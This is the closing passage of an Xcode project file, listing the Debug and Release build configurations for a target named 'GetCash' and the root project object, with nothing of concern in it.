		735C8D272EF5212F00C7D507 /* Build configuration list for PBXNativeTarget "GetCash" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				735C8D282EF5212F00C7D507 /* Debug */,
				735C8D292EF5212F00C7D507 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */
	};
	rootObject = 735C8D0C2EF5212D00C7D507 /* Project object */;
}
